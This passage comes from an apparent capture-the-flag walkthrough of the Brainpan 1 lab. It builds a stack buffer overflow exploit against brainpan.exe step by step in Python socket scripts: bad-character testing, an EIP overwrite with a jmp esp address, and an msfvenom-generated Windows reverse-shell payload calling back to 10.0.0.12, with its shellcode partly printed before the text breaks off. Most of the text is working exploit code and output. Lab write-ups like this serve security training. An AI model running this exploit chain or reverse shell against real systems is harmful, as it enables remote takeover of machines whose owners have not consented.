<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div> <div class="caption"> brain_0x05.py </div> <p><br> Run the code again. Check the EIP register and ensure that our 42s are in the EIP register.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/brainpan1/checkeip42.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Check the EIP for 42s" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Check the ESP and the four bytes prior. The four prior bytes should be 42s from our EIP. This would mean that the ESP sits right next to the EIP register.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/brainpan1/checkespalign.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Check the ESP alignment" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br></p> <p><br> Time to determine the bad characters. Update the code with all of the bad characters except 00, the null byte. The null byte is overwhelmingly often a bad character.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">socket</span>

<span class="n">ip</span> <span class="o">=</span> <span class="sh">'</span><span class="s">10.0.0.11</span><span class="sh">'</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>

<span class="c1"># baddies = \x00
</span>
<span class="n">badchars</span> <span class="o">=</span> <span class="p">(</span>
  <span class="sa">b</span><span class="sh">"</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10</span><span class="sh">"</span>
  <span class="sa">b</span><span class="sh">"</span><span class="se">\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span class="sh">"</span>
  <span class="sa">b</span><span class="sh">"</span><span class="se">\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30</span><span class="sh">"</span>
  <span class="sa">b</span><span class="sh">"</span><span class="se">\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span class="sh">"</span>
  <span class="sa">b</span><span class="sh">"</span><span class="se">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50</span><span class="sh">"</span>
  <span class="sa">b</span><span class="sh">"</span><span class="se">\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60</span><span class="sh">"</span>
  <span class="sa">b</span><span class="sh">"</span><span class="se">\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70</span><span class="sh">"</span>
  <span class="sa">b</span><span class="sh">"</span><span class="se">\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80</span><span class="sh">"</span>
  <span class="sa">b</span><span class="sh">"</span><span class="se">\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90</span><span class="sh">"</span>
  <span class="sa">b</span><span class="sh">"</span><span class="se">\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span class="sh">"</span>
  <span class="sa">b</span><span class="sh">"</span><span class="se">\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0</span><span class="sh">"</span>
  <span class="sa">b</span><span class="sh">"</span><span class="se">\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0</span><span class="sh">"</span>
  <span class="sa">b</span><span class="sh">"</span><span class="se">\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0</span><span class="sh">"</span>
  <span class="sa">b</span><span class="sh">"</span><span class="se">\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0</span><span class="sh">"</span>
  <span class="sa">b</span><span class="sh">"</span><span class="se">\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0</span><span class="sh">"</span>
  <span class="sa">b</span><span class="sh">"</span><span class="se">\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="sh">"</span>
<span class="p">)</span>

<span class="n">inputBuffer</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">524</span>
<span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">B</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">4</span>
<span class="n">inputBuffer</span> <span class="o">+=</span> <span class="n">badchars</span>
<span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">C</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1100</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[*] Sending: {size}</span><span class="se">\n</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">size</span><span class="o">=</span><span class="nf">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">)))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">inputBuffer</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\r\n</span><span class="sh">'</span><span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div> <div class="caption"> brain_0x06.py </div> <p><br> Run the code. Check the ESP register and check the characters in the payload. All the characters from the hex list <b>should</b> be in the ESP. If there is any drop off, remove that character, send the payload again, and repeat until all the characters appear in ESP.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/brainpan1/badcharesp.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Check the ESP for Bad Chars" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Update the code to import pack and give a space for the payload.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">socket</span>
<span class="kn">from</span> <span class="n">struct</span> <span class="kn">import</span> <span class="n">pack</span>

<span class="n">ip</span> <span class="o">=</span> <span class="sh">'</span><span class="s">10.0.0.11</span><span class="sh">'</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>

<span class="c1">#baddies = \x00
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
  <span class="sa">b</span><span class="sh">'</span><span class="s">D</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">400</span>
<span class="p">)</span>

<span class="n">inputBuffer</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">524</span>
<span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">B</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">4</span>
<span class="n">inputBuffer</span> <span class="o">+=</span> <span class="n">payload</span>
<span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">C</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1100</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[*] Sending: {size}</span><span class="se">\n</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">size</span><span class="o">=</span><span class="nf">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">)))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">inputBuffer</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\r\n</span><span class="sh">'</span><span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div> <div class="caption"> brain_0x07.py </div> <p><br> In Windbg, load the narly extension.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/brainpan1/loadnarly.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Load the Narly Extension" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Run the !nmod to load all of the various modules and their associated protections. Choose a module that does not have any bad chars in the address space, does not have DEP enabled, and does not have ASLR enabled. Preference is always given to modules that ship with the program due to portability. If a Windows module is chosen, the exploit is Windows version dependent. For this, note the brainpan.exe address range.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/brainpan1/nmod.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Load the !nmod command" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Use msf-nasm_shell to determine the hexadecimal opcodes for the jmp esp assembly command.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/brainpan]
└─<span class="nv">$ </span>msf-nasm_shell                        
nasm <span class="o">&gt;</span> jmp esp
00000000  FFE4              jmp esp
</code></pre></div></div> <p><br> Search in Windbg for a jmp esp memory address.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/brainpan1/findjmpespaddress.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Check for a JMP ESP command" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Update the python script with the address of jmp.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">socket</span>
<span class="kn">from</span> <span class="n">struct</span> <span class="kn">import</span> <span class="n">pack</span>

<span class="n">ip</span> <span class="o">=</span> <span class="sh">'</span><span class="s">10.0.0.11</span><span class="sh">'</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>

<span class="c1">#baddies = \x00
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
  <span class="sa">b</span><span class="sh">'</span><span class="s">D</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">400</span>
<span class="p">)</span>

<span class="n">inputBuffer</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">524</span>
<span class="n">inputBuffer</span> <span class="o">+=</span> <span class="nf">pack</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;L</span><span class="sh">'</span><span class="p">,(</span><span class="mh">0x311712f3</span><span class="p">))</span>
<span class="n">inputBuffer</span> <span class="o">+=</span> <span class="n">payload</span>
<span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">C</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1100</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[*] Sending: {size}</span><span class="se">\n</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">size</span><span class="o">=</span><span class="nf">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">)))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">inputBuffer</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\r\n</span><span class="sh">'</span><span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div> <div class="caption"> brain_0x08.py </div> <p><br> Set up a breakpoint in Windbg at the jmp esp address.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/brainpan1/setbreakpoint.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Set a Breakpoint at our Address" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Run the code and check Windbg to see if the breakpoint tripped.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/brainpan1/checkbreakcatch.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Catch the Breakpoint" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Step the code one more time and it should lead into the esp and the Ds payload that was set up.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/brainpan1/seeDpayload.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Check the Jump into ESP" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Use msfvenom to generate a payload.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/brainpan]
└─<span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.0.0.12 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nv">ExitFunc</span><span class="o">=</span>thread <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-f</span> python <span class="nt">-v</span> payload
<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 <span class="o">(</span><span class="nv">iteration</span><span class="o">=</span>0<span class="o">)</span>
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1899 bytes
payload <span class="o">=</span>  b<span class="s2">""</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">da</span><span class="se">\x</span><span class="s2">cf</span><span class="se">\x</span><span class="s2">bb</span><span class="se">\x</span><span class="s2">b2</span><span class="se">\x</span><span class="s2">1e</span><span class="se">\x</span><span class="s2">d7</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">d9</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">f4"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">17</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">17"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\x</span><span class="s2">35</span><span class="se">\x</span><span class="s2">b4</span><span class="se">\x</span><span class="s2">85</span><span class="se">\x</span><span class="s2">cb</span><span class="se">\x</span><span class="s2">3b</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">0c"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">90</span><span class="se">\x</span><span class="s2">3d</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">a5</span><span class="se">\x</span><span class="s2">d1</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">ad</span><span class="se">\x</span><span class="s2">b7"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">82</span><span class="se">\x</span><span class="s2">07</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">23</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">2c</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">91</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">0a"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">22</span><span class="se">\x</span><span class="s2">78</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">ea</span><span class="se">\x</span><span class="s2">a0</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">a3</span><span class="se">\x</span><span class="s2">cc</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">4b"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">b6</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">dd</span><span class="se">\x</span><span class="s2">b6</span><span class="se">\x</span><span class="s2">3b</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">b6</span><span class="se">\x</span><span class="s2">bd</span><span class="se">\x</span><span class="s2">ee</span><span class="se">\x</span><span class="s2">4f</span><span class="se">\x</span><span class="s2">b3"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">32</span><span class="se">\x</span><span class="s2">e4</span><span class="se">\x</span><span class="s2">8f</span><span class="se">\x</span><span class="s2">1d</span><span class="se">\x</span><span class="s2">33</span><span class="se">\x</span><span class="s2">19</span><span class="se">\x</span><span class="s2">47</span><span class="se">\x</span><span class="s2">1f</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">8c"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">d3</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">b4</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">f3</span><span class="se">\x</span><span class="s2">fd</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">54</span><span class="se">\x</span><span class="s2">3e</span><span class="se">\x</span><span class="s2">b7"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">cc</span><span class="se">\x</span><span class="s2">ae</span><span class="se">\x</span><span class="s2">b4</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">35</span><span class="se">\x</span><span class="s2">e4</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">cf</span><span class="se">\x</span><span class="s2">c7"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">ae</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">c6</span><span class="se">\x</span><span class="s2">0a</span><span class="se">\x</span><span class="s2">c5</span><span class="se">\x</span><span class="s2">94</span><span class="se">\x</span><span class="s2">1d</span><span class="se">\x</span><span class="s2">70"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">85</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">82</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">54</span><span class="se">\x</span><span class="s2">e2"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">ac</span><span class="se">\x</span><span class="s2">ec</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">f6</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">09</span><span class="se">\x</span><span class="s2">8f</span><span class="se">\x</span><span class="s2">f9"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">07</span><span class="se">\x</span><span class="s2">98</span><span class="se">\x</span><span class="s2">cb</span><span class="se">\x</span><span class="s2">dd</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">7c</span><span class="se">\x</span><span class="s2">92</span><span class="se">\x</span><span class="s2">ac</span><span class="se">\x</span><span class="s2">7f"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">c4</span><span class="se">\x</span><span class="s2">0e</span><span class="se">\x</span><span class="s2">df</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">8f</span><span class="se">\x</span><span class="s2">a3</span><span class="se">\x</span><span class="s2">34</span><span class="se">\x</span><span class="s2">55</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">ab"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">f9</span><span class="se">\x</span><span class="s2">54</span><span class="se">\x</span><span class="s2">ec</span><span class="se">\x</span><span class="s2">2b</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">9f</span><span class="se">\x</span><span class="s2">19</span><span class="se">\x</span><span class="s2">39</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">37"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">b2</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">55</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">33</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">a8</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">44"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">14</span><span class="se">\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">e7</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">67</span><span class="se">\x</span><span class="s2">32"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">af</span><span class="se">\x</span><span class="s2">bf</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">ed</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">a8</span><span class="se">\x</span><span class="s2">5d</span><span class="se">\x</span><span class="s2">f9</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">27"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">19</span><span class="se">\x</span><span class="s2">86</span><span class="se">\x</span><span class="s2">ed</span><span class="se">\x</span><span class="s2">aa</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">7d</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">df</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">7d"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">7a</span><span class="se">\x</span><span class="s2">b7</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">7d</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">ce</span><span class="se">\x</span><span class="s2">9b</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">87"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">34</span><span class="se">\x</span><span class="s2">86</span><span class="se">\x</span><span class="s2">8b</span><span class="se">\x</span><span class="s2">82</span><span class="se">\x</span><span class="s2">ce</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">19</span><span class="se">\x</span><span class="s2">ab</span><span class="se">\x</span><span class="s2">78</span><span class="se">\x</span><span class="s2">df"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">ae</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">28</span><span class="se">\x</span><span class="s2">da</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">af</span><span class="se">\x</span><span class="s2">d8</span><span class="se">\x</span><span class="s2">91</span><span class="se">\x</span><span class="s2">3c</span><span class="se">\x</span><span class="s2">66"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">e6</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">28</span><span class="se">\x</span><span class="s2">e4</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">d4</span><span class="se">\x</span><span class="s2">a8</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">ff"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">9a</span><span class="se">\x</span><span class="s2">95</span><span class="se">\x</span><span class="s2">d8</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">34</span><span class="se">\x</span><span class="s2">8b</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">95</span><span class="se">\x</span><span class="s2">7f"</span>
payload +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">8e</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">a5</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">4a</span><span class="se">\x</span><span class="s2">db"</span>
